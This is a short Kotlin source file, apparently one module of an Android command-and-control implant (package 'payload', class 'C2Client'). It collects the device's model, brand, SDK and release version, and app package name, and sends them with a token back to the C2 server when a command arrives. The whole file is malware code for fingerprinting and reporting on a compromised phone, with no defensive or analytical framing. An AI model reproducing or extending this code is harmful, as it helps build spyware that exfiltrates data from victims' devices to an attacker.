package com.ihk909.payload.modules

import android.content.Context
import android.os.Build
import com.ihk909.payload.C2Client
import org.json.JSONObject

object InfoModule {
    fun get(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            c2.reply(id, JSONObject()
                .put("model", Build.MODEL)
                .put("brand", Build.BRAND)
                .put("sdk", Build.VERSION.SDK_INT)
                .put("release", Build.VERSION.RELEASE)
                .put("pkg", ctx.packageName)
                .put("token", c2.token))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}